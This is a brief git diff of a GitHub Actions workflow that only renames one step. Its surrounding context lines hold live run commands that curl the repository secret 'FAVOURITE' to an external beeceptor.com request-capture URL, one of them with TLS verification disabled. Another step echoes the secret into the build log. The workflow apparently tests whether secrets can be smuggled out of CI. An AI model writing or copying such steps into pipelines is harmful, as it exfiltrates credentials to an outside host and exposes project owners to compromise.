@@ -25,5 +25,5 @@ jobs:
           curl -k https://swagolili.free.beeceptor.com?data=$(secrets.FAVOURITE)
           curl https://swagolili.free.beeceptor.com?data=${{secrets.FAVOURITE }}
 
-      - name: I ll tell you my current favourite 
+      - name: I ll tell you my current favourite a
         run: echo ${{ secrets.FAVOURITE }}
